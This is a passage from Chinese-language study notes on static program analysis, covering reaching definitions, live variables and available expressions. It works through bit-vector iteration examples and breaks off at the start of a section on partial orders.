<li><p>状况1：<code>IN[S2] = OUT[S1]</code>，常见流程</p>
</li>
<li><p>状况2：<code>IN[S2]、IN[S3] = OUT[S1]</code>，分支流程</p>
</li>
<li><p>状况3：<code>IN[S2] = OUT[S1] ^ OUT[S3]</code>，交汇流程</p>
<p>其中的合并操作称为<code>meet</code>操作，常见有取交集、并集之类的，需要定义</p>
</li>
</ul>

        <h3 id="分析方向"   >
          <a href="#分析方向" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析方向" class="headerlink" title="分析方向"></a>分析方向</h3>
      <ul>
<li><p><code>Forward Analysis</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230102820182.png" alt="image-20221230102820182"></p>
<p>相关公式<br>$$<br>OUT[s] = f_s(IN[s])<br>$$</p>
</li>
<li><p><code>Backward Analysis</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230102900026.png" alt="image-20221230102900026"></p>
<p>相关公式<br>$$<br>IN[s] = f_s(OUT[s])<br>$$</p>
</li>
</ul>

        <h2 id="2-BB之间的分析"   >
          <a href="#2-BB之间的分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BB之间的分析" class="headerlink" title="2.BB之间的分析"></a>2.<code>BB</code>之间的分析</h2>
      <ul>
<li><p>在一个基本块<code>BB</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230103138670.png" alt="image-20221230103138670"></p>
<p><code>IN[s]</code>以及<code>OUT[s]</code>可以用一个循环表示<br>$$<br>IN[s_{i+1}] = OUT[s_i], for\ all\ i = 1,2, …, n-1\<br>OUT[s_i] = f_s(IN[s_{i-1}])<br>$$</p>
</li>
<li><p>同样的多个基本块<code>BB</code>中</p>
<ul>
<li>即<code>B1 -&gt; B2 -&gt; B3</code>这样的</li>
</ul>
<p>$$<br>IN[B] = IN[s_1],  OUT[B] = OUT[s_n]\<br>OUT[B] = f_B(IN[B]), f_B = f_{sn} \ ⚬ \ …\  ⚬\  f_{s2}\ ⚬\ f_{s1}<br>$$</p>
<ul>
<li><p>当然还有其它的，交汇</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230105038522.png" alt="image-20221230105038522"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = ^p OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>其中<code>^p</code>代表取所有的<code>p</code>做<code>meet</code>操作</p>
</li>
<li><p>还有分支，分支的<code>OUT[B]</code>都等于下一个的<code>IN[B.]</code></p>
</li>
</ul>
</li>
</ul>

        <h2 id="3-Reaching-Definition"   >
          <a href="#3-Reaching-Definition" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Reaching-Definition" class="headerlink" title="3.Reaching Definition"></a>3.Reaching Definition</h2>
      <p>即一个变量<code>v</code>从定义点<code>p</code>，到某一点<code>q</code>这条路径中，<code>v</code>没有再被重新定义，那么这条路径可以被当作<code>Reaching Definition</code>，如果再被重新定义了，则不能，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230111227435.png" alt="image-20221230111227435"></p>

        <h3 id="Data-Flow-Facts"   >
          <a href="#Data-Flow-Facts" class="heading-link"><i class="fas fa-link"></i></a><a href="#Data-Flow-Facts" class="headerlink" title="Data Flow Facts"></a>Data Flow Facts</h3>
      <p>将所有定义变量的语句标记为一个<code>bit</code>向量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230111953040.png" alt="image-20221230111953040"></p>

        <h3 id="Control-Flow"   >
          <a href="#Control-Flow" class="heading-link"><i class="fas fa-link"></i></a><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3>
      <p>用来求<code>IN[B]</code>，例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230112722811.png" alt="image-20221230112722811"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = Up  predecessor of B OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>其中<code>Up</code>代表取<code>B</code>的前驱，即所有的<code>p</code>做<code>union</code>操作，即并集</p>

        <h3 id="Transfer-Function"   >
          <a href="#Transfer-Function" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3>
      <p>即数据流分析中的转换函数的相关定义，<code>forward</code>下知道<code>IN[B]</code>用来求<code>OUT[B]</code><br>$$<br>OUT[B] = gen_B\ U\ (IN[B] - kill_B)<br>$$</p>
<ul>
<li><code>genB</code>：表示当前基本块中定义的所有变量的合集</li>
<li><code>killB</code>：表示当前基本块中定义的所有变量，并且这些变量在其他基本块中也被定义了的合集</li>
</ul>
<p>例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230112140537.png" alt="image-20221230112140537"></p>

        <h3 id="Algorithm"   >
          <a href="#Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230113741886.png" alt="image-20221230113741886"></p>
<p>其中对于每个<code>BB</code>的赋值，在<code>may analysis</code>中大多为空，而在<code>must analysis</code>中大多不为空，所以并没有把<code>OUT[entry] = ∅; </code>加进来</p>

        <h4 id="例子"   >
          <a href="#例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子" class="headerlink" title="例子"></a>例子</h4>
      <p>如下所示，初始化之后即可迭代</p>

        <h5 id="第一次迭代"   >
          <a href="#第一次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代" class="headerlink" title="第一次迭代"></a>第一次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230115302112.png" alt="image-20221230115302112"></p>
<ul>
<li><p><code>Entry-&gt;B1</code>：</p>
<ul>
<li><p><code>OUT[Entry] = 0000 0000</code></p>
</li>
<li><p><code>IN[B1] = Up OUT[p] = OUT[Entry] = 0000 0000</code></p>
</li>
<li><p><code>genB1 = D1 + D2 = 1100 0000 </code></p>
</li>
<li><p><code>killB1 = D5 + D7 + D4 = 0001 1010  </code></p>
</li>
<li><p><code>IN[B1] - killB1 = 0000 0000 - 0001 1010 = 0000 0000</code></p>
<p>都是0，减去之后还是0</p>
</li>
<li><p><code>OUT[B1] = genB1 U (IN[B1] - killB1) = 1100 0000 + 0000 0000 = 1100 0000</code>   </p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230121324875.png" alt="image-20221230121324875"></p>
</li>
<li><p><code>B1-&gt;B2</code>：</p>
<ul>
<li><code>OUT[B1] = genB1 U (IN[B1] - killB1) = 1100 0000 + 0000 0000 = 1100 0000</code>   </li>
<li><code>IN[B2]  = Up OUT[p] = OUT[B1] + OUT[B4] = 1100 0000</code></li>
<li><code>genB2 = D3 + D4 = 0011 0000 </code></li>
<li><code>killB2 = D2 = 0100 0000  </code></li>
<li><code>IN[B2] - killB2 = 1100 0000 - 0100 0000 = 1000 0000</code></li>
<li><code>OUT[B2] = genB2 U (IN[B2] - killB2) = 0011 0000 + 1000 0000 = 1011 0000</code>   </li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230121420467.png" alt="image-20221230121420467"></p>
</li>
<li><p><code>B2-&gt;B3</code>：</p>
<ul>
<li><p><code>OUT[B2] = genB2 U (IN[B2] - killB2) = 0011 0000 + 1000 0000 = 1011 0000</code>   </p>
</li>
<li><p><code>IN[B3]  = Up OUT[p] = OUT[B2] = 1011 0000</code></p>
</li>
<li><p><code>genB3 = D7 = 0000 0010</code></p>
</li>
<li><p><code>killB3 = D1 + D5  = 1000 1000</code></p>
</li>
<li><p><code>IN[B3] - killB3 = 1011 0000 - 1000 1000 = 0011 0000</code></p>
</li>
<li><p><code>OUT[B3] = genB3 U (IN[B3] - killB3) = 0000 0010 + 0011 0000 = 0011 0010</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230122517800.png" alt="image-20221230122517800"></p>
</li>
</ul>
</li>
<li><p><code>B2-&gt;B4</code>：</p>
<ul>
<li><p><code>OUT[B2] = genB2 U (IN[B2] - killB2) = 0011 0000 + 1000 0000 = 1011 0000</code>   </p>
</li>
<li><p><code>IN[B4] = Up OUT[p] = OUT[B2] = 1011 0000 </code></p>
</li>
<li><p><code>genB4 = D5 + D6 = 0000 1100</code></p>
</li>
<li><p><code>killB4 = D1 + D7 + D8 = 1000 0011</code></p>
</li>
<li><p><code>IN[B4] - killB4 = 1011 0000 - 1000 0011 = 0011 0000</code></p>
</li>
<li><p><code>OUT[B4] = genB4 U (IN[B4] - killB4) = 0000 1100 + 0011 0000 = 0011 1100</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230122538028.png" alt="image-20221230122538028"></p>
</li>
</ul>
</li>
<li><p><code>B4、B3-&gt;B5</code></p>
<ul>
<li><p><code>OUT[B3] = genB3 U (IN[B3] - killB3) = 0000 0010 + 0011 0000 = 0011 0010</code></p>
</li>
<li><p><code>OUT[B4] = genB4 U (IN[B4] - killB4) = 0000 1100 + 0011 0000 = 0011 1100</code></p>
</li>
<li><p><code>IN[B5] = Up OUT[p] = OUT[B3] + OUT[B4] = 0011 0010 + 0011 1100 = 0011 1110</code></p>
</li>
<li><p><code>genB5 = D8 = 0000 0001</code></p>
</li>
<li><p><code>killB5 = D6 = 0000 0100</code></p>
</li>
<li><p><code>IN[B5] - killB5 = 0011 1110 - 0000 0100 = 0011 1010</code></p>
</li>
<li><p><code>OUT[B5] = genB5 U (IN[B5] - killB5) = 0000 0001 + 0011 1010 = 0011 1011</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230122557226.png" alt="image-20221230122557226"></p>
</li>
</ul>
</li>
</ul>
<p>那么由于第一次迭代之后，<code>B1、B2、B3、B4、B5</code>的<code>OUT</code>都发生改变了，所以继续迭代，所有基本块的<code>OUT</code>被本次迭代结果替换</p>

        <h5 id="第二次迭代"   >
          <a href="#第二次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代" class="headerlink" title="第二次迭代"></a>第二次迭代</h5>
      <p>完成如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230122957105.png" alt="image-20221230122957105"></p>
<p>那么基本块<code>B2、B3</code>的<code>OUT</code>发生了改变，接着迭代</p>

        <h5 id="第三次迭代"   >
          <a href="#第三次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代" class="headerlink" title="第三次迭代"></a>第三次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230123059166.png" alt="image-20221230123059166"></p>
<p>迭代之后，所有基本块的<code>OUT</code>都没有发生改变，那么即可得到最终结果。</p>

        <h5 id="最终含义"   >
          <a href="#最终含义" class="heading-link"><i class="fas fa-link"></i></a><a href="#最终含义" class="headerlink" title="最终含义"></a>最终含义</h5>
      <p>依据最终结果，即所有基本块的<code>OUT[Bn]</code>可得，比如对于<code>OUT[B1]</code>而言，对应结果为<code>1100 0000</code>，代表<code>D1、D2</code>可以<code>Reach</code>到<code>B1</code>结束的地方，也就是说<code>D1、D2</code>所定义的变量从被定义到<code>B1</code>结束的地方都不会被改变。</p>

        <h1 id="三、Data-Flow-Analysis-Applications-II"   >
          <a href="#三、Data-Flow-Analysis-Applications-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、Data-Flow-Analysis-Applications-II" class="headerlink" title="三、Data Flow Analysis - Applications II"></a>三、Data Flow Analysis - Applications II</h1>
      
        <h2 id="1-Live-Variables-Analysis"   >
          <a href="#1-Live-Variables-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Live-Variables-Analysis" class="headerlink" title="1.Live Variables Analysis"></a>1.Live Variables Analysis</h2>
      <p>即存在一个变量<code>v</code>在点<code>p</code>被定义，然后程序中还存在一个变量<code>v</code>被使用的地方<code>use(v)</code>，满足从<code>p</code>到<code>use(v)</code>这条路径上，<code>v</code>没有被重新定义，那么可以称为变量<code>v</code>在点<code>p</code>到<code>use(v)</code>这条路径上是存活的，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230155034133.png" alt="image-20221230155034133"></p>
<ul>
<li>应用</li>
</ul>
<p>比如寄存器满的状态，这时候在<code>p</code>点发现变量<code>v</code>是<code>dead</code>的，并且该变量在寄存器中，那么新的变量最好就是替换掉<code>dead</code>变量<code>v</code>。</p>

        <h3 id="Data-Flow-Facts-1"   >
          <a href="#Data-Flow-Facts-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Data-Flow-Facts-1" class="headerlink" title="Data Flow Facts"></a>Data Flow Facts</h3>
      <p>将所有变量的标记为一个<code>bit</code>向量，和之前类似，<code>1</code>表<code>alive</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230155541698.png" alt="image-20221230155541698"></p>

        <h3 id="Control-Flow-1"   >
          <a href="#Control-Flow-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Control-Flow-1" class="headerlink" title="Control Flow"></a>Control Flow</h3>
      <p>用来求<code>OUT[B]</code>的，例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230163405006.png" alt="image-20221230163405006"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OUT[B] = Us successor of B IN[S]</span><br></pre></td></tr></table></div></figure>

<p>其中<code>Us</code>代表取<code>B</code>的后继，即所有的<code>s</code>做<code>union</code>操作，即并集</p>

        <h3 id="Transfer-Function-1"   >
          <a href="#Transfer-Function-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Function-1" class="headerlink" title="Transfer Function"></a>Transfer Function</h3>
      <p>由于是<code>backward</code>，所以即知道<code>OUB[B]</code>来求<code>IN[B]</code><br>$$<br>IN[B] = use_B\ U\ (OUT[B]\ -\ def_B)<br>$$</p>
<ul>
<li><p><code>useB</code>：在基本块<code>BB</code>中在重定义之前被使用的变量的合集</p>
<p>比如某个基本块<code>v = 2; k = v</code>，由于<code>v</code>是在被重定义之后被使用的，所以变量<code>v</code>不被归入到<code>useB</code>中</p>
</li>
<li><p><code>defB</code>：在基本块<code>BB</code>中被重定义或首次定义的变量的合集</p>
</li>
</ul>

        <h3 id="Algorithm-1"   >
          <a href="#Algorithm-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithm-1" class="headerlink" title="Algorithm"></a>Algorithm</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230163808603.png" alt="image-20221230163808603"></p>
<p>同样进行简单初始化即可开始迭代</p>

        <h4 id="例子-1"   >
          <a href="#例子-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4>
      <p>如下所示，初始化之后即可迭代</p>

        <h5 id="第一次迭代-1"   >
          <a href="#第一次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-1" class="headerlink" title="第一次迭代"></a>第一次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230164205006.png" alt="image-20221230164205006"></p>
<ul>
<li><p><code>Exit-&gt;B5</code>：</p>
<ul>
<li><code>IN[Exit] = 000 0000</code></li>
<li> <code>OUT[B5] = Us IN[s] = IN[Exit] = 000 0000</code></li>
<li><code>defB5 = z = 001 0000</code></li>
<li><code>useB5 = p = 000 1000</code></li>
<li><code>OUT[B5] - defB5 = 000 0000</code></li>
<li><code>IN[B5] = useB5 + (OUT[B5] - defB5) = 000 1000 + 000 0000 = 000 1000 </code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171348741.png" alt="image-20221230171348741"></p>
</li>
<li><p><code>B5-&gt;B3</code>：</p>
<ul>
<li><code>IN[B5] = useB5 + (OUT[B5] - defB5) = 000 0100 + 000 0000 = 000 1000 </code></li>
<li><code>OUT[B3] = Us IN[s] = IN[B5] = 000 1000</code></li>
<li><code>defB3 = x = 100 0000</code></li>
<li><code>useB3 = x = 100 0000</code></li>
<li><code>OUT[B3] - defB3 = 000 1000</code></li>
<li><code>IN[B3] = useB3 + (OUT[B3] - defB3) = 100 0000 + 000 1000 = 100 1000</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171409470.png" alt="image-20221230171409470"></p>
</li>
<li><p><code>B5-&gt;B4</code>：</p>
<ul>
<li><code>IN[B5] = useB5 + (OUT[B5] - defB5) = 000 0100 + 000 0000 = 000 1000 </code></li>
<li><code>OUT[B4] = Us IN[s] = IN[B5] + IN[B2] = 000 1000 + 000 0000 = 000 1000 </code></li>
<li><code>defB4 = x + q = 100 0100</code>  </li>
<li><code>useB4 = y = 010 0000</code></li>
<li><code>OUT[B4] - defB4 = 000 1000</code></li>
<li><code>IN[B4] = useB4 + (OUT[B4] - defB4) = 010 0000 + 000 1000 = 010 1000</code> </li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171426774.png" alt="image-20221230171426774"></p>
</li>
<li><p><code>B4、B3-&gt;B2</code>:</p>
<ul>
<li><p><code>IN[B4] = useB4 + (OUT[B4] - defB4) = 010 0000 + 000 1000 = 010 1000</code> </p>
</li>
<li><p><code>IN[B3] = useB3 + (OUT[B3] - defB3) = 100 0000 + 000 1000 = 100 1000</code></p>
</li>
<li><p><code>OUT[B2] = Us IN[s] = IN[B3] + IN[B4] = 110 1000 </code></p>
</li>
<li><p><code>defB2 = m + y = 010 0010</code></p>
</li>
<li><p><code>useB2 = k = 000 0001</code></p>
<p>注意<code>m</code>是在被使用之前重定义了，所以不能算在<code>useB2</code>中</p>
</li>
<li><p><code>OUT[B2] - defB2 = 100 1000</code></p>
</li>
<li><p><code>IN[B2] = useB2 + (OUT[B2] - defB2) = 000 0001 + 100 1000 = 100 1001</code></p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171452976.png" alt="image-20221230171452976"></p>
</li>
<li><p><code>B2-&gt;B1</code>：</p>
<ul>
<li><code>IN[B2] = userB2 + (OUT[B2] - defB2) = 000 0001 + 100 1000 = 100 1001</code></li>
<li><code>OUT[B1] = Us IN[s] = IN[B2] = 100 1001</code></li>
<li><code>defB1 = x + y = 110 0000</code></li>
<li><code>useB1 = p + q + z = 001 1100</code></li>
<li><code>OUT[B1] - defB1 = 000 1001</code></li>
<li><code>IN[B1] = useB1 + (OUT[B1] - defB1) = 001 1100 + 000 1001 = 001 1101</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171510996.png" alt="image-20221230171510996"></p>
</li>
</ul>
<p>基本块<code>B1、B2、B3、B4、B5</code>的<code>IN[]</code>都发生改变，需要再次迭代，结果如下</p>

        <h5 id="第二次迭代-1"   >
          <a href="#第二次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-1" class="headerlink" title="第二次迭代"></a>第二次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230170947293.png" alt="image-20221230170947293"></p>
<p>其中<code>B4</code>的<code>IN[]</code>发生改变，需要再次迭代，结果如下</p>

        <h5 id="第三次迭代-1"   >
          <a href="#第三次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代-1" class="headerlink" title="第三次迭代"></a>第三次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171054036.png" alt="image-20221230171054036"></p>
<p>没有基本块的<code>IN[]</code>被改变了，那么不用迭代了</p>

        <h5 id="最终含义-1"   >
          <a href="#最终含义-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#最终含义-1" class="headerlink" title="最终含义"></a>最终含义</h5>
      <p>同样道理，依据最终结果，比如这里的<code>IN[B3]</code>为<code>100 1000</code>，那么代表在进入基本块<code>B3</code>之前，变量<code>x、p</code>是存活的，在之后的流程中会用到，其他变量在之后的流程不会用到，为<code>dead</code>变量</p>

        <h2 id="2-Available-Expressions-Analysis"   >
          <a href="#2-Available-Expressions-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Available-Expressions-Analysis" class="headerlink" title="2.Available Expressions Analysis"></a>2.Available Expressions Analysis</h2>
      <ul>
<li><p>概念</p>
<p>一个表达式<code>x op y</code>如果说在在<code>p</code>点是<code>available</code>的话，那么满足如下条件：</p>
<ul>
<li><p>所有从<code>entry</code>到<code>p</code>的路径都会计算表达式<code>x op y</code></p>
</li>
<li><p>在最后一次计算表达式<code>x op y</code>之后，到<code>p</code>之前，没有再重新定义变量<code>x</code>或者<code> y</code></p>
</li>
</ul>
</li>
<li><p>应用</p>
<ul>
<li>可以将一个<code>available</code>的表达式<code>x op y</code>的计算结果，替换成上一次计算表达式<code>x op y </code>的结果，使得不再重复计算</li>
<li>用来检测全局公用的子表达式</li>
</ul>
</li>
<li><p>类型：</p>
<ul>
<li>属于是<code>must analysis</code>，一旦分析出结果，代表该结果一定正确，一定是为<code>available</code></li>
</ul>
</li>
</ul>

        <h3 id="Data-Flow-Facts-2"   >
          <a href="#Data-Flow-Facts-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Data-Flow-Facts-2" class="headerlink" title="Data Flow Facts"></a>Data Flow Facts</h3>
      <p>和之前类似，将所有表达式都用<code>bit</code>向量表示，为1代表<code>available</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230190653551.png" alt="image-20221230190653551"></p>

        <h3 id="Control-Flow-2"   >
          <a href="#Control-Flow-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Control-Flow-2" class="headerlink" title="Control Flow"></a>Control Flow</h3>
      <p><code>forward</code>中求<code>IN[B]</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230112722811.png" alt="image-20221230112722811"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = ∩p predecessor of B OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>即为<code>∩p</code>求基本块<code>B</code>所有前驱的<code>OUT[p]</code>的交集</p>

        <h3 id="Transfer-Function-2"   >
          <a href="#Transfer-Function-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Function-2" class="headerlink" title="Transfer Function"></a>Transfer Function</h3>
      <p>为<code>forward</code>，知道<code>IN[B]</code>用来求<code>OUT[B]</code><br>$$<br>OUT[B] = gen_B\ U\ (IN[B] - kill_B)<br>$$</p>
<ul>
<li><p><code>genB</code>：当前基本块中用到的表达式</p>
</li>
<li><p><code>killB</code>：所有在<code>IN[]</code>中的表达式的变量参与进基本块<code>B</code>中重新定义的表达式合集</p>
<p>比如基本块<code> a = x op y</code>，其中<code>IN[B]</code>为<code>a + b</code>，那么由于<code>IN</code>中变量<code>a</code>在基本块<code>B</code>中重新定义了，所以将<code>IN[B]</code>中关于变量<code>a</code>的表达式都加入到<code>killB</code>中</p>
</li>
</ul>

        <h3 id="Algorithm-2"   >
          <a href="#Algorithm-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithm-2" class="headerlink" title="Algorithm"></a>Algorithm</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230192724776.png" alt="image-20221230192724776"></p>
<p>这里的除了<code>entry</code>外，其他基本块都初始化为<code>top</code>，即<code>1111..111</code>，因为就算有个表达式没有找出来，那就只是代表少优化一次，不影响程序本身的运行流程</p>

        <h4 id="例子-2"   >
          <a href="#例子-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4>
      <p>如下所示，初始化之后即可开始迭代</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230192931922.png" alt="image-20221230192931922"></p>

        <h5 id="第一次迭代-2"   >
          <a href="#第一次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-2" class="headerlink" title="第一次迭代"></a>第一次迭代</h5>
      <ul>
<li><p><code>Entry-&gt;B1</code>：</p>
<ul>
<li><code>OUT[Entry] = 00000</code></li>
<li><code>IN[B1] = ∩p predecessor of B OUT[p] = OUT[Entry] = 00000</code></li>
<li><code>genB1 = p-1 = 10000</code></li>
<li><code>killB1 = 00000</code></li>
<li><code>IN[B1] - killB1 = 00000</code></li>
<li><code>OUT[B1] = genB1 + (IN[B1] - killB1) = 10000</code></li>
</ul>
</li>
<li><p><code>B1-&gt;B2</code>：</p>
<ul>
<li><code>OUT[B1] = 10000 </code></li>
<li><code>IN[B2] = ∩p predecessor of B OUT[p] = OUT[B1] ∩ OUT[B4] = 10000 ∩ 11111 = 10000</code></li>
<li><code>genB2 = z/5和e^7*x = 01010</code></li>
<li><code>killB2 = p-1 = 10000</code></li>
<li><code>IN[B2] - killB2 = 00000</code></li>
<li><code>OUT[B2] = genB2 + (IN[B2] - killB2) = 01010</code></li>
</ul>
</li>
<li><p><code>B2-&gt;B3</code>：</p>
<ul>
<li><p><code>OUT[B2] = 01010</code></p>
</li>
<li><p><code>IN[B3] = ∩p predecessor of B OUT[p] = OUT[B2] = 01010</code></p>
</li>
<li><p><code>genB3 = y+3 = 00001</code></p>
</li>
<li><p><code>killB3 = 01000</code></p>
<p>其中<code>z</code>在<code>IN[B3]</code>中有表达式<code>z/5</code>用到，那么需要将对应表达式加入到<code>killB3</code>集合中</p>
</li>
<li><p><code>IN[B3] - killB3 = 00010</code></p>
</li>
<li><p><code>OUT[B3] = genB3 + (IN[B3] - killB3) = 00011</code></p>
</li>
</ul>
</li>
<li><p><code>B2-&gt;B4</code>：</p>
<ul>
<li><code>OUT[B2] = 01010</code></li>
<li><code>IN[B4] = ∩p predecessor of B OUT[p] = OUT[B2] = 01010</code></li>
<li><code>genB4 = 2*y和e^7*x = 00110</code></li>
<li><code>killB4 = 00010</code></li>
<li><code>IN[B4] - killB4 = 01000</code></li>
<li><code>OUT[B4] = genB3 + (IN[B4] - killB4) = 01110</code></li>
</ul>
</li>
<li><p><code>B3、B4-&gt;B5</code>：</p>
<ul>
<li><code>OUT[B3] = 00011</code></li>
<li><code>OUT[B4] = 01110</code></li>
<li><code>IN[B5] = ∩p predecessor of B OUT[p] = OUT[B4] ∩ OUT[B3] = 00010</code></li>
<li><code>genB5 = e^7*x和z/5 = 01010</code></li>
<li><code>killB5 = 00000</code></li>
<li><code>IN[B5] - killB5 = 00010</code></li>
<li><code>OUT[B5] = genB5 + (IN[B5] - killB5) = 01010</code></li>
</ul>
</li>
</ul>
<p>基本块<code>B1、B2、B3、B4、B5</code>的<code>OUT[]</code>都发生改变，需要再次遍历</p>

        <h5 id="第二次迭代-2"   >
          <a href="#第二次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-2" class="headerlink" title="第二次迭代"></a>第二次迭代</h5>
      <p>同理可得，结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230195310159.png" alt="image-20221230195310159"></p>
<p>没有基本块的<code>OUT[]</code>发生改变，可为最终结果</p>

        <h5 id="最终含义-2"   >
          <a href="#最终含义-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#最终含义-2" class="headerlink" title="最终含义"></a>最终含义</h5>
      <p>依据最终结果，拿基本块<code>B2</code>而言，对于表达式<code>e^7*x</code>是<code>available</code>的，那么在程序第一次经过<code>B2</code>时，由于表达式<code>e^7*x</code>还没被计算，那么先计算，然后保存。当通过循环第二次经过<code>B2</code>时，其表达式<code>e^7*x</code>就可以被直接替换为上一次表达式的值，在这里也就是在基本块<code>B4</code>中得到的值，其他的同理可得。</p>

        <h2 id="3-Data-Flow-Analysis总结"   >
          <a href="#3-Data-Flow-Analysis总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Data-Flow-Analysis总结" class="headerlink" title="3.Data Flow Analysis总结"></a>3.Data Flow Analysis总结</h2>
      
        <h3 id="异同"   >
          <a href="#异同" class="heading-link"><i class="fas fa-link"></i></a><a href="#异同" class="headerlink" title="异同"></a>异同</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230200017051.png" alt="image-20221230200017051"></p>

        <h3 id="需要掌握的"   >
          <a href="#需要掌握的" class="heading-link"><i class="fas fa-link"></i></a><a href="#需要掌握的" class="headerlink" title="需要掌握的"></a>需要掌握的</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230200156658.png" alt="image-20221230200156658"></p>
<p>三种数据流分析算法、异同以及为什么迭代算法可以停止</p>
<p>停止的原因就是迭代到最后，最差的情况就是全是<code>top:1111..</code>或者全是<code>bottom:0000....</code></p>

        <h1 id="四、Data-Flow-Analysis-Foundations-I"   >
          <a href="#四、Data-Flow-Analysis-Foundations-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、Data-Flow-Analysis-Foundations-I" class="headerlink" title="四、Data Flow Analysis - Foundations I"></a>四、Data Flow Analysis - Foundations I</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105124710.png" alt="image-20230114105124710"></p>

        <h2 id="1-偏序-Partial-Order"   >
